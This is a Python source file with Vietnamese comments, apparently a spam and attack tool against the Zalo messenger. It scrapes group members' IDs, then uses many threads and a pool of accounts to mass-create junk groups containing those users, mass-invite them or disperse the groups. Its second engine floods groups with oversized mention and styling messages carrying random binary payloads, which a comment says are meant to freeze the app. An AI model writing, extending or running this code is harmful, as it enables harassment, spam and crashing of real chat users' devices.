# * DEV KHÔI PHAN +
# Nhà Phát Triển Chính Thức & Độc Quyền
# Bản quyền © 2026 — ZENVYRE ULTRA C++ ENGINE

import os, json, time, random, base64, ctypes, secrets, threading, subprocess, platform, struct
from collections import defaultdict
from queue import Queue

class EXEbykhoiphan:
    _cpp_lib = None
    _rate_limits = defaultdict(list)
    _lock = threading.RLock()

    @classmethod
    def _load_cpp_core(cls):
        if cls._cpp_lib is not None:
            return True
        with cls._lock:
            if cls._cpp_lib is not None:
                return True
            try:
                base_dir = os.path.dirname(os.path.abspath(__file__))
                cpp_src = os.path.join(base_dir, "zalo_core.cpp")
                lib_ext = ".dll" if platform.system() == "Windows" else ".so"
                lib_path = os.path.join(base_dir, "zalo_core" + lib_ext)

                if not os.path.exists(lib_path) and os.path.exists(cpp_src):
                    subprocess.run(
                        ["g++", "-shared", "-O3", "-fPIC", cpp_src, "-o", lib_path],
                        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )

                if os.path.exists(lib_path):
                    cls._cpp_lib = ctypes.CDLL(lib_path)
                    cls._cpp_lib.build_binary_payload.restype = ctypes.POINTER(ctypes.c_uint8)
                    cls._cpp_lib.build_binary_payload.argtypes = [
                        ctypes.c_char_p, ctypes.c_char_p, ctypes.c_int, ctypes.POINTER(ctypes.c_int)
                    ]
                    cls._cpp_lib.free_binary_payload.argtypes = [ctypes.POINTER(ctypes.c_uint8)]
                    return True
            except Exception:
                pass
        return False

    @classmethod
    def _fallback_cpp_struct(cls, gid, imei):
        """Nếu server không có g++, tự động dùng Python tạo Binary Struct tương tự C++"""
        buf = bytearray()
        buf.extend(struct.pack("<I", 0x5A4C4F32))
        buf.extend(struct.pack("<I", len(gid)) + gid.encode("utf-8"))
        buf.extend(struct.pack("<I", len(imei)) + imei.encode("utf-8"))
        buf.extend(struct.pack("<I", 5000))
        for _ in range(5000):
            buf.extend(struct.pack("<I", random.randint(0, 0xFFFFFFFF)))
            payload = os.urandom(random.randint(32, 64))
            buf.extend(struct.pack("<H", len(payload)) + payload)
        buf.extend(struct.pack("<I", 0x454E4432))
        return base64.b64encode(bytes(buf)).decode("utf-8")

    @classmethod
    def _get_cpp_payload_b64(cls, gid, imei):
        gid_s = str(gid or "").strip()
        imei_s = str(imei or "").strip()
        if not cls._load_cpp_core():
            return cls._fallback_cpp_struct(gid_s, imei_s)
        try:
            out_len = ctypes.c_int(0)
            ptr = cls._cpp_lib.build_binary_payload(
                gid_s.encode("utf-8"), imei_s.encode("utf-8"), 10, ctypes.byref(out_len)
            )
            if ptr:
                data = ctypes.string_at(ptr, out_len.value)
                cls._cpp_lib.free_binary_payload(ptr)
                return base64.b64encode(data).decode("utf-8")
        except Exception:
            pass
        return cls._fallback_cpp_struct(gid_s, imei_s)

    @classmethod
    def _check_rate_limit(cls, key, max_req=40, window=1.0):
        with cls._lock:
            now = time.time()
            cls._rate_limits[key] = [t for t in cls._rate_limits[key] if now - t < window]
            if len(cls._rate_limits[key]) >= max_req:
                return False
            cls._rate_limits[key].append(now)
            return True

    @classmethod
    def get_all_uids(cls, zc, gid):
        """Thu hoạch sâu 100% thành viên nhóm qua 5 lớp dự phòng (đảm bảo nhóm 2-3 người vẫn hoạt động 100%)"""
        gid_s = str(gid or "").strip()
        uids, seen = [], set()
        my_uid = str(getattr(zc, "uid", "") or "").strip()

        def _add_uid(val):
            v = str(val or "").strip().split("_")[0].strip()
            if v.isdigit() and v not in ("0", my_uid, gid_s) and v not in seen:
                seen.add(v)
                uids.append(v)

        # Lớp 1: Quét qua get_members_full của Zalo client (nếu có)
        try:
            if hasattr(zc, "get_members_full"):
                for m in (zc.get_members_full(gid_s, use_cache=False) or []):
                    if isinstance(m, dict):
                        _add_uid(m.get("uid") or m.get("id") or m.get("userId"))
        except Exception:
            pass

        # Lớp 2: Quét trực tiếp từ API getmg-v2 (cả memVerList, currentMems, memInfoList, adminIds, creatorId)
        try:
            active_s = getattr(zc, "prio_s", None) or zc.s
            for pl_g in (
                {"gridVerMap": json.dumps({gid_s: 0})},
                {"grid": gid_s, "imei": zc.imei},
            ):
                enc = zc._enc(pl_g)
                r = active_s.post(
                    "https://tt-group-wpa.chat.zalo.me/api/group/getmg-v2",
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": enc},
                    timeout=(2.0, 4.0)
                )
                if r.status_code == 200 and r.content:
                    dec = zc._dec(r.json().get("data", ""))
                    if dec:
                        parsed = json.loads(dec)
                        d = parsed.get("data") if isinstance(parsed, dict) and isinstance(parsed.get("data"), dict) else parsed
                        gmap = (d.get("gridInfoMap") or {}) if isinstance(d, dict) else {}
                        obj = gmap.get(gid_s) or (next(iter(gmap.values())) if gmap else d)
                        if isinstance(obj, dict):
                            _add_uid(obj.get("creatorId"))
                            for x in (obj.get("adminIds") or []):
                                _add_uid(x)
                            for mv in (obj.get("memVerList") or []):
                                _add_uid(mv)
                            for list_k in ("currentMems", "memInfoList", "members", "updateMems"):
                                for m in (obj.get(list_k) or []):
                                    if isinstance(m, dict):
                                        _add_uid(m.get("userId") or m.get("id") or m.get("uid"))
                                    else:
                                        _add_uid(m)
                            if uids:
                                break
        except Exception:
            pass

        # Lớp 3: Quét từ lịch sử tin nhắn gần nhất trong nhóm
        if len(uids) < 3:
            try:
                if hasattr(zc, "get_recent_group_messages"):
                    for rm in (zc.get_recent_group_messages(gid_s) or []):
                        if isinstance(rm, dict):
                            _add_uid(rm.get("uidFrom") or rm.get("fromUid"))
            except Exception:
                pass

        # Lớp 4: Nếu mục tiêu là chat 1-1 hoặc nhóm nhỏ chỉ có 1 người đối diện, đệm thêm UID từ danh sách bạn bè để đủ >= 2 người tạo nhóm rác
        if not uids and gid_s.isdigit() and gid_s != my_uid:
            _add_uid(gid_s)

        if len(uids) < 2:
            try:
                if hasattr(zc, "friends"):
                    for fr in (zc.friends(use_cache=True) or []):
                        if isinstance(fr, dict):
                            _add_uid(fr.get("uid") or fr.get("id") or fr.get("userId"))
                        if len(uids) >= 3:
                            break
            except Exception:
                pass

        if my_uid and my_uid.isdigit() and my_uid not in seen:
            uids.append(my_uid)
        return uids

    # ============================================================
    # WORKER 1: KÉO MEM + GIẢI TÁN (Dùng chung Queue, không lo -32)
    # ============================================================
    @classmethod
    def _worker_trash_disperse(cls, task_queue, stop_ev, do_disperse=False):
        while not stop_ev.is_set():
            try:
                task = task_queue.get(timeout=1.0)
                zc, gid, target_uids, my_uid = task
                active_s = getattr(zc, "prio_s", None) or zc.s

                if not cls._check_rate_limit(f"trash_{zc.imei}", max_req=20, window=1.0):
                    time.sleep(0.05)
                    task_queue.put(task)
                    continue

                batch = list(target_uids[:35])
                if my_uid and my_uid not in batch:
                    batch.append(my_uid)
                if len(batch) < 2:
                    # Kể cả khi chỉ có 1 mục tiêu, bắn thông báo giải tán trực tiếp qua spam_group_disband_notification
                    if do_disperse and hasattr(zc, "spam_group_disband_notification"):
                        try:
                            zc.spam_group_disband_notification(gid, send_inbox_alert=False)
                        except Exception:
                            pass
                    time.sleep(0.2)
                    continue

                vname = f"Box {secrets.token_hex(3)}"
                cli = int(time.time() * 1000) + random.randint(1, 9999)

                pl = {
                    "clientId": cli, "gname": vname, "gdesc": None, "members": batch,
                    "membersTypes": [-1] * len(batch), "nameChanged": 1,
                    "createLink": 1, "clientLang": "vi", "imei": zc.imei, "zsource": 601
                }
                enc = zc._enc(pl)
                r = active_s.post(
                    "https://tt-group-wpa.chat.zalo.me/api/group/create",
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": enc},
                    timeout=(1.5, 3.0)
                )

                new_grid = ""
                if r.status_code == 200 and r.content:
                    rj = r.json()
                    if rj.get("data"):
                        dec_s = zc._dec(rj["data"])
                        if dec_s:
                            dec = json.loads(dec_s)
                            d = dec.get("data") if isinstance(dec, dict) and isinstance(dec.get("data"), dict) else dec
                            if isinstance(d, dict):
                                new_grid = str(d.get("groupId") or d.get("grid") or "")

                if new_grid.isdigit():
                    if do_disperse:
                        time.sleep(0.12)
                        dp_pl = {"grid": new_grid, "groupId": new_grid, "imei": zc.imei}
                        active_s.post(
                            "https://tt-group-wpa.chat.zalo.me/api/group/disperse",
                            params={"zpw_ver": 645, "zpw_type": 30},
                            data={"params": zc._enc(dp_pl)},
                            timeout=(1.5, 3.0)
                        )
                    else:
                        inv_mems = target_uids[:30]
                        invite_pl = {
                            "grid": new_grid, "members": inv_mems,
                            "memberTypes": [-1] * len(inv_mems), "src": 2, "imei": zc.imei
                        }
                        active_s.post(
                            "https://tt-group-wpa.chat.zalo.me/api/group/invite/v2",
                            params={"zpw_ver": 645, "zpw_type": 30},
                            data={"params": zc._enc(invite_pl)},
                            timeout=(1.2, 2.5)
                        )
                elif do_disperse:
                    # Dự phòng: nếu /api/group/create bị giới hạn tạm thời, bắn thông báo giải tán trực tiếp vào nhóm
                    if hasattr(zc, "spam_group_disband_notification"):
                        try:
                            zc.spam_group_disband_notification(gid, send_inbox_alert=False)
                        except Exception:
                            pass
            except Exception:
                time.sleep(0.05)

    @classmethod
    def start_trash_engine(cls, zc_pool, gid, stop_ev, do_disperse=False, num_workers=8):
        if not zc_pool:
            return
        uids = cls.get_all_uids(zc_pool[0], gid)
        my_uid = str(getattr(zc_pool[0], "uid", "") or "").strip()
        target_uids = [u for u in uids if u != my_uid]
        if not target_uids and str(gid).isdigit() and str(gid) != my_uid:
            target_uids = [str(gid)]

        task_queue = Queue(maxsize=60)
        for _ in range(num_workers):
            threading.Thread(
                target=cls._worker_trash_disperse,
                args=(task_queue, stop_ev, do_disperse),
                daemon=True
            ).start()

        while not stop_ev.is_set():
            try:
                zc = random.choice(zc_pool)
                task_queue.put((zc, str(gid), target_uids, my_uid), timeout=0.5)
            except Exception:
                pass
            if stop_ev.wait(0.04):
                break

    # ============================================================
    # WORKER 2: MENTION BẰNG C++ (Làm Đơ App)
    # ============================================================
    @classmethod
    def _worker_mention(cls, task_queue, stop_ev):
        while not stop_ev.is_set():
            try:
                task = task_queue.get(timeout=1.0)
                zc, gid, uids = task
                active_s = getattr(zc, "prio_s", None) or zc.s

                if not cls._check_rate_limit(f"mention_{zc.imei}", max_req=18, window=1.0):
                    time.sleep(0.05)
                    task_queue.put(task)
                    continue

                cpp_b64 = cls._get_cpp_payload_b64(gid, zc.imei)
                msg_str = cpp_b64[:2400]
                eff_uids = uids if uids else [str(zc.uid or gid)]
                m_arr = [
                    {"pos": i * 2, "len": 1, "uid": str(eff_uids[i % len(eff_uids)]), "type": 0}
                    for i in range(min(50, max(10, len(eff_uids) * 5)))
                ]
                styles_arr = [{"start": i * 10, "len": 5, "st": "b,c_db342e"} for i in range(120)]
                t_prop = json.dumps({"styles": styles_arr, "ver": 0}, separators=(",", ":"))
                m_info = json.dumps(m_arr, separators=(",", ":"))

                pl = {
                    "grid": str(gid),
                    "message": msg_str,
                    "clientId": int(time.time() * 1000) + random.randint(1, 9999),
                    "imei": zc.imei,
                    "ttl": 0,
                    "visibility": 0,
                    "mentionInfo": m_info,
                    "textProperties": t_prop,
                    "params": t_prop,
                }
                enc_pl = zc._enc(pl)
                sent_ok = False
                for ep in (
                    "https://tt-group-wpa.chat.zalo.me/api/group/mention",
                    "https://group-wpa.chat.zalo.me/api/group/mention",
                    "https://tt-group-wpa.chat.zalo.me/api/group/sendmsg",
                ):
                    try:
                        r = active_s.post(
                            ep,
                            params={"zpw_ver": 645, "zpw_type": 30},
                            data={"params": enc_pl},
                            timeout=(1.2, 2.5)
                        )
                        if r.status_code == 200 and r.content:
                            rj = r.json()
                            if rj.get("error_code") == 0:
                                sent_ok = True
                                break
                    except Exception:
                        continue
                if not sent_ok and hasattr(zc, "send_adv"):
                    try:
                        zc.send_adv(
                            msg_str[:1800], str(gid),
                            color_mode="word_rainbow", is_group=True,
                            tag_all=True, is_heading=True, antiband=False, priority_bypass=True
                        )
                    except Exception:
                        pass
            except Exception:
                time.sleep(0.05)

    @classmethod
    def start_mention_engine(cls, zc_pool, gid, stop_ev, num_workers=8):
        if not zc_pool:
            return
        uids = cls.get_all_uids(zc_pool[0], gid)
        if not uids:
            uids = [str(getattr(zc_pool[0], "uid", "") or gid)]
        task_queue = Queue(maxsize=60)
        for _ in range(num_workers):
            threading.Thread(
                target=cls._worker_mention,
                args=(task_queue, stop_ev),
                daemon=True
            ).start()

        while not stop_ev.is_set():
            try:
                zc = random.choice(zc_pool)
                task_queue.put((zc, str(gid), uids), timeout=0.5)
            except Exception:
                pass
            if stop_ev.wait(0.04):
                break
